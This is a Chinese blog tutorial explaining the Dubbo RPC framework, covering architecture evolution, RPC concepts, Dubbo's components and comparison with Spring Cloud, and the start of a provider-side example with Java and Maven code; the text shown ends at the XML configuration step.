<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Brath-Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Brath-Blog"><meta name="msapplication-TileImage" content="https://brath.cloud/avatar.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Brath-Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Brath-Blog"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Brath-Blog"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="Brath"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Brath-Blog","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"Brath"},"publisher":{"@type":"Organization","name":"Brath-Blog","logo":{"@type":"ImageObject","url":"https://brath.cloud/avatar.png"}},"description":""}</script><link rel="icon" href="https://brath.cloud/avatar.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://brath.cloud/avatar.png" alt="Brath-Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">文章列表</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">更多</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Guoqing815"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:49.000Z" title="2023/4/27 17:20:49">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-29T11:04:20.517Z" title="2023/4/29 19:04:20">2023-04-29</time>更新</span><span class="level-item">1 小时读完 (大约11033个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Dubbo%E3%80%91Dubbo%E8%AF%A6%E8%A7%A3%EF%BC%8C%E7%94%A8%E5%BF%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B0%B1%E5%A4%9F%E4%BA%86%E3%80%90%E9%87%8D%E7%82%B9%E3%80%91/">【Dubbo】Dubbo详解，用心看这一篇文章就够了【重点】</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="dubbodubbo详解用心看这一篇文章就够了重点"><a class="markdownIt-Anchor" href="#dubbodubbo详解用心看这一篇文章就够了重点">#</a> 【Dubbo】Dubbo 详解，用心看这一篇文章就够了【重点】</h2>
<h2 id="11-dubbo概述"><a class="markdownIt-Anchor" href="#11-dubbo概述">#</a> 1.1  <code>Dubbo</code>  概述</h2>
<p><strong> <code>Dubbo</code>  是阿里巴巴开源的基于  <code>Java</code>  的高性能 <code>RPC</code> （一种远程调用） 分布式服务框架，致力于提供高性能和透明化的 <code>RPC</code>  远程服务调用方案，以及 <code>SOA</code>  服务治理方案</strong>。</p>
<p>每天为 <code>2</code>  千多个服务提供大于 <code>30</code>  亿次访问量支持，并被广泛应用于阿里巴巴集团的各成员站点以及别的公司的业务中。</p>
<p>简单的说， <code>Dubbo</code>  就是个服务框架，如果没有分布式的需求，其实是不需要用的，只有在分布式的时候，才有 <code>Dubbo</code>  这样的分布式服务框架的需求。</p>
<p>并且本质上是个远程服务调用的分布式框架（告别 <code>Web Service</code>  模式中的 <code>WSdl</code> ，以服务者与消费者的方式在 <code>Dubbo</code>  上注册）</p>
<p>其核心部分包含：</p>
<p>1、<strong>远程通讯</strong>：提供对多种基于长连接的 <code>NIO</code>  框架抽象封装，包括多种线程模型，序列化，以及 “请求 - 响应” 模式的信息交换方式。<br>
2、<strong>集群容错</strong>：提供基于接口方法的透明远程过程调用，包括多协议支持，以及软负载均衡，失败容错，地址路由，动态配置等集群支持。<br>
3、<strong>自动发现</strong>：基于注册中心目录服务，使服务消费方能动态的查找服务提供方，使地址透明，使服务提供方可以平滑增加或减少机器。</p>
<h2 id="12-dubbo背景"><a class="markdownIt-Anchor" href="#12-dubbo背景">#</a> 1.2  <code>Dubbo</code>  背景</h2>
<p><code>Dubbo</code>  开始于电商系统，因此在这里先从电商系统的演变讲起。</p>
<h3 id="121-单一应用框架"><a class="markdownIt-Anchor" href="#121-单一应用框架">#</a> 1.2.1 单一应用框架</h3>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/9529d3b51c5f4fa4944fc793a542688a.png" alt="在这里插入图片描述"><br>
当网站流量很小时，只需一个应用，将所有功能如下单支付等都部署在一起，以减少部署节点和成本。</p>
<p><strong>缺点</strong>：单一的系统架构，使得在开发过程中，占用的资源越来越多，而且随着流量的增加越来越难以维护。</p>
<h3 id="122-垂直应用框架"><a class="markdownIt-Anchor" href="#122-垂直应用框架">#</a> 1.2.2 垂直应用框架</h3>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/a7579c9f3b0e4a928d2bedde32fd2f1f.png" alt="在这里插入图片描述"><br>
垂直应用架构解决了单一应用架构所面临的扩容问题，流量能够分散到各个子系统当中，且系统的体积可控，一定程度上降低了开发人员之间协同以及维护的成本，提升了开发效率。</p>
<p><strong>缺点</strong>：但是在垂直架构中相同逻辑代码需要不断的复制，不能复用。</p>
<h3 id="123-分布式应用架构rpc"><a class="markdownIt-Anchor" href="#123-分布式应用架构rpc">#</a> 1.2.3 分布式应用架构 ( <code>RPC</code> )</h3>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/36242cd9be084aea8c2c30643485c960.png" alt="在这里插入图片描述"><br>
当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心。</p>
<h3 id="124-流动计算架构soa"><a class="markdownIt-Anchor" href="#124-流动计算架构soa">#</a> 1.2.4 流动计算架构 ( <code>SOA</code> )</h3>
<p>随着服务化的进一步发展，服务越来越多，服务之间的调用和依赖关系也越来越复杂，诞生了面向服务的架构体系 ( <code>SOA</code> )，也因此衍生出了一系列相应的技术，如对服务提供、服务调用、连接处理、通信协议、序列化方式、服务发现、服务路由、日志输出等行为进行封装的服务框架。</p>
<h3 id="125-架构演变详解"><a class="markdownIt-Anchor" href="#125-架构演变详解">#</a> 1.2.5 架构演变详解</h3>
<p>从以上是电商系统的演变可以看出架构演变的过程：<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/58b4c7452c0243fdb318d0282d603f94.png" alt="在这里插入图片描述"><br>
 1、单应用单服务器；<br>
2、单应用拆分成多个应用并部署到多个服务器；<br>
3、单应用拆分成多个应用并实现分布式部署；<br>
4、流动计算框架（用于提高机器利用率的资源调度和治理中心）</p>
<h4 id="1251-单一应用架构"><a class="markdownIt-Anchor" href="#1251-单一应用架构">#</a> 1.2.5.1 单一应用架构</h4>
<p>当网站流量很小时，只需一个应用，将所有功能都部署在一起，以减少部署节点和成本。 此时，用于简化增删改查工作量的 数据访问框架 ( <code>ORM</code> ) 是关键。</p>
<h4 id="1252-垂直应用架构"><a class="markdownIt-Anchor" href="#1252-垂直应用架构">#</a> 1.2.5.2 垂直应用架构</h4>
<p>当访问量逐渐增大，单一应用增加机器带来的加速度越来越小，将应用拆成互不相干的几个应用，以提升效率。此时，用于加速前端页面开发的  <code>Web</code>  框架 ( <code>MVC</code> ) 是关键。</p>
<h4 id="1253-分布式服务架构"><a class="markdownIt-Anchor" href="#1253-分布式服务架构">#</a> 1.2.5.3 分布式服务架构</h4>
<p>当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，使前端应用能更快速的响应多变的市场需求。此时，用于提高业务复用及整合的 分布式服务框架 ( <code>RPC</code> ) 是关键。</p>
<h4 id="1254-流动计算架构"><a class="markdownIt-Anchor" href="#1254-流动计算架构">#</a> 1.2.5.4 流动计算架构</h4>
<p>当服务越来越多，容量的评估，小服务资源的浪费等问题逐渐显现，此时需增加一个调度中心基于访问压力实时管理集群容量，提高集群利用率。此时，用于提高机器利用率的 资源调度和治理中心 ( <code>SOA</code> ) 是关键。</p>
<h3 id="126-rpc的简介"><a class="markdownIt-Anchor" href="#126-rpc的简介">#</a> 1.2.6  <code>RPC</code>  的简介</h3>
<p><strong> <code>RPC(Remote Procedure Call Protocol)</code> ：远程过程调用</strong></p>
<p>两台服务器 <code>A、B</code> ，分别部署不同的应用 <code>a,b</code> 。当 <code>A</code>  服务器想要调用 <code>B</code>  服务器上应用 <code>b</code>  提供的函数或方法的时候，由于不在一个内存空间，不能直接调用，需要通过网络来表达调用的语义传达调用的数据。<br>
说白了，就是你在你的机器上写了一个程序，我这边是无法直接调用的，这个时候就出现了一个远程服务调用的概念。</p>
<p><code>RPC</code>  是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。 <code>RPC</code>  协议假定某些传输协议的存在，如 <code>TCP</code>  或 <code>UDP</code> ，为通信程序之间携带信息数据。在 <code>OSI</code>  网络通信模型中， <code>RPC</code>  跨越了传输层和应用层。 <code>RPC</code>  使得开发包括网络分布式多程序在内的应用程序更加容易。<br>
<strong> <code>RPC</code>  采用客户机 / 服务器模式</strong>。请求程序就是一个客户机，而服务提供程序就是一个服务器。首先，客户机调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。</p>
<h4 id="1261-rpc需要解决的问题"><a class="markdownIt-Anchor" href="#1261-rpc需要解决的问题">#</a> 1.2.6.1  <code>RPC</code>  需要解决的问题</h4>
<ul>
<li><strong>通讯问题</strong>：主要是通过在客户端和服务器之间建立 TCP 连接，远程过程调用的所有交换的数据都在这个连接里传输。连接可以是按需连接，调用结束后就断掉，也可以是长连接，多个远程过程调用共享同一个连接。</li>
<li><strong>寻址问题</strong>：A 服务器上的应用怎么告诉底层的 RPC 框架，如何连接到 B 服务器（如主机或 <code>IP</code>  地址）以及特定的端口，方法的名称名称是什么，这样才能完成调用。比如基于 <code>Web</code>  服务协议栈的 <code>RPC</code> ，就要提供一个 <code>endpoint URI</code> ，或者是从 <code>UDDI</code>  服务上查找。如果是 <code>RMI</code>  调用的话，还需要一个 <code>RMI Registry</code>  来注册服务的地址。</li>
<li><strong>序列化 与 反序列化</strong>：当 <code>A</code>  服务器上的应用发起远程过程调用时，方法的参数需要通过底层的网络协议如 <code>TCP</code>  传递到 <code>B</code>  服务器，由于网络协议是基于二进制的，内存中的参数的值要序列化成二进制的形式，也就是序列化（ <code>Serialize</code> ）或编组（ <code>marshal</code> ），通过寻址和传输将序列化的二进制发送给 <code>B</code>  服务器。<br>
同理， <code>B</code>  服务器接收参数要将参数反序列化。B 服务器应用调用自己的方法处理后返回的结果也要序列化给 <code>A</code>  服务器， <code>A</code>  服务器接收也要经过反序列化的过程。</li>
</ul>
<h2 id="13-dubbo作用"><a class="markdownIt-Anchor" href="#13-dubbo作用">#</a> 1.3  <code>Dubbo</code>  作用</h2>
<p>我们一起来看一下 <code>Dubbo</code>  的服务治理图：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/b42b2f9c1b1e4c56b36ea55673c037fd.png" alt="在这里插入图片描述"></p>
<h3 id="131-为什么使用dubbo"><a class="markdownIt-Anchor" href="#131-为什么使用dubbo">#</a> 1.3.1 为什么使用 <code>Dubbo</code></h3>
<p>因为是阿里开源项目，国内很多互联网公司都在用，已经经过很多线上考验。内部使用了 <code>Netty、Zookeeper</code> ，保证了高性能高可用性。</p>
<ul>
<li><strong>使用 <code>Dubbo</code>  可以将核心业务抽取出来，作为独立的服务</strong>，逐渐形成稳定的服务中心，可用于提高业务复用灵活扩展，使前端应用能更快速的响应多变的市场需求。</li>
<li>分布式架构可以承受更大规模的并发流量。</li>
</ul>
<h3 id="132-dubbo能做什么"><a class="markdownIt-Anchor" href="#132-dubbo能做什么">#</a> 1.3.2  <code>Dubbo</code>  能做什么</h3>
<p>1、<strong>透明化的远程方法调用</strong>，就像调用本地方法一样调用远程方法，只需简单配置，没有任何 <code>API</code>  侵入。<br>
2、<strong>软负载均衡及容错机制</strong>，可在内网替代 <code>F5</code>  等硬件负载均衡器，降低成本，减少单点。<br>
3.、<strong>服务自动注册与发现</strong>，不再需要写死服务提供方地址，注册中心基于接口名查询服务提供者的 <code>IP</code>  地址，并且能够平滑添加或删除服务提供者。</p>
<p><strong> <code>Dubbo</code>  采用全 <code>Spring</code>  配置方式，透明化接入应用，对应用没有任何 <code>API</code>  侵入，只需用 <code>Spring</code>  加载 <code>Dubbo</code>  的配置即可</strong>， <code>Dubbo</code>  基于 <code>Spring</code>  的 <code>Schema</code>  扩展进行加载。</p>
<h2 id="14-dubbo-和-spring-cloud区别"><a class="markdownIt-Anchor" href="#14-dubbo-和-spring-cloud区别">#</a> 1.4  <code>Dubbo</code>  和  <code>Spring Cloud</code>  区别</h2>
<p>1、<strong>通信方式不同</strong>： <code>Dubbo</code>  使用的是  <code>RPC</code>  通信，而 <code>Spring Cloud</code>  使用的是 <code>HTTP RESTFul</code>  方式。<br>
2、<strong>组成不一样</strong>：</p>
<ul>
<li><code>dubbo</code>  的服务注册中心为 <code>Zookeerper</code> ，服务监控中心为 <code>dubbo-monitor</code> ，无消息总线、服务跟踪、批量任务等组件；</li>
<li><code>Spring Cloud</code>  的服务注册中心为 <code>spring-cloud netflix enruka</code> ，服务监控中心为 <code>spring-boot admin</code> ，有消息总线、数据流、服务跟踪、批量任务等组件；</li>
</ul>
<h2 id="15-dubbo技术架构"><a class="markdownIt-Anchor" href="#15-dubbo技术架构">#</a> 1.5  <code>Dubbo</code>  技术架构</h2>
<p>首先我们一起来看一下 <code>Dubbo</code>  官网提供的架构图：<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/7792efd1449d4117b828af6c1022e089.png" alt="在这里插入图片描述"><br>
<strong>节点角色说明</strong></p>
<table>
<thead>
<tr>
<th>节点</th>
<th>角色说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Provider</td>
<td>暴露服务的服务提供方</td>
</tr>
<tr>
<td>Consumer</td>
<td>调用远程服务的服务消费方</td>
</tr>
<tr>
<td>Registry</td>
<td>服务注册与发现的注册中心</td>
</tr>
<tr>
<td>Monitor</td>
<td>统计服务的调用次数和调用时间的监控中心</td>
</tr>
<tr>
<td>Container</td>
<td>服务运行容器</td>
</tr>
</tbody>
</table>
<p>看了这几个概念后似乎发现其实 <code>Dubbo</code>  的架构也是很简单的 (其实现细节是复杂)，为什么这么说呢，有没有发现，其实很像<strong>生产者 - 消费者</strong>模型。只是在这种模型上，加上了<strong>注册中心和监控中心</strong>，用于管理提供方提供的 <code>url</code> ，以及管理整个过程。</p>
<p><strong>调用关系说明</strong></p>
<p>1、服务容器负责启动，加载，运行服务提供者。<br>
2、服务提供者在启动时，向注册中心注册自己提供的服务。<br>
3、服务消费者在启动时，向注册中心订阅自己所需的服务。<br>
4、注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。<br>
5、服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。<br>
6、服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。</p>
<hr>
<p>那么，整个<strong>发布 - 订阅</strong>的过程就非常的简单了：</p>
<ul>
<li>启动容器，加载，运行服务提供者。</li>
<li>服务提供者在启动时，在注册中心发布注册自己提供的服务。</li>
<li>服务消费者在启动时，在注册中心订阅自己所需的服务。</li>
</ul>
<p>如果考虑<strong>失败或变更</strong>的情况，就需要考虑下面的过程：</p>
<ul>
<li>注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。</li>
<li>服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。</li>
<li>服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。</li>
</ul>
<h2 id="16-dubbo入门案例"><a class="markdownIt-Anchor" href="#16-dubbo入门案例">#</a> 1.6  <code>Dubbo</code>  入门案例</h2>
<h3 id="161-服务端"><a class="markdownIt-Anchor" href="#161-服务端">#</a> 1.6.1 服务端</h3>
<p>首先，我们先把服务端的接口写好，因为其实 <code>dubbo</code>  的作用简单来说就是给消费端提供接口。</p>
<p><strong>接口定义</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * xml方式服务提供者接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProviderService</span> &#123;</span><br><span class="line">    String <span class="title function_">SayHello</span><span class="params">(String word)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个接口非常简单，只是包含一个  <code>SayHello</code>  的方法。</p>
<p>接着，定义它的<strong>实现类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * xml方式服务提供者实现类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProviderServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">ProviderService</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">SayHello</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就把我们的接口写好了，那么我们应该怎么将我们的服务暴露出去呢？</p>
<p><strong>导入 maven 依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ouyangsihai<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-provider<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/dubbo --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.netty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>netty-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.32.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-framework<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里使用的 <code>dubbo</code>  的版本是 <code>2.6.6</code> ，需要注意的是，如果你只导入 <code>dubbo</code>  的包的时候是会报错的，找不到 <code>netty</code>  和 <code>curator</code>  的依赖，所以，在这里我们需要把这两个的依赖加上，就不会报错了。</p>
<p>另外，这里我们使用  <code>zookeeper</code>  作为注册中心。</p>
<p>到目前为止， <code>dubbo</code>  需要的环境就已经可以了，下面，我们就把上面刚刚定义的接口暴露出去。</p>
<p><strong>暴露接口（ <code>xml</code>  配置方法）</strong><br>
首先，我们在我们项目的 <code>resource</code>  目录下创建  <code>META-INF.spring</code>  包，然后再创建  <code>provider.xml</code>  文件，名字可以任取哦，如下图所示</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/5b512b42ca2b41ed82fd82aaeee060dd.png" alt="在这里插入图片描述"></p>
